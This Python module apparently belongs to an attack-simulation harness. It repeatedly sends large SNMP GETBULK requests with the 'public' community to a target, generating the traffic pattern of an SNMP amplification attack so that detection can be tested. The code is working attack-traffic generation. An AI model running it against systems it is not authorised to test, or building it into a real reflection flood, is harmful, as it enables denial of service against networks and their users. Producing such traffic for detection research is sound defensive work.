"""SNMP amplification injector (MITRE T1498.002).

Issues GETBULK requests with a large max-repetitions so a small request elicits a
large response — the reflection/amplification fingerprint: high getbulk rate and
large response packets.
"""

from __future__ import annotations

import logging
import os
import random
import subprocess
import threading

LOG = logging.getLogger("attack.snmp_amplify")


def run(server_ip: str, stop_event: threading.Event) -> None:
    intensity = os.getenv("ATTACK_INTENSITY", "loud").lower()
    burst = 8 if intensity == "loud" else 2
    gap = (0.3, 1.0) if intensity == "loud" else (5.0, 10.0)
    max_reps = 50 if intensity == "loud" else 25
    rng = random.Random(909)

    LOG.warning("SNMP amplification injector active (intensity=%s, max-rep=%d)",
                intensity, max_reps)
    while not stop_event.is_set():
        for _ in range(burst):
            cmd = ["snmpbulkget", "-v2c", "-c", "public", "-t", "2", "-r", "0",
                   "-Cn0", f"-Cr{max_reps}", "-On", server_ip, "1.3.6.1.2.1.2.2"]
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               timeout=8, check=False)
            except (subprocess.TimeoutExpired, OSError) as exc:
                LOG.debug("snmpbulkget -> %s", exc)
        stop_event.wait(rng.uniform(*gap))
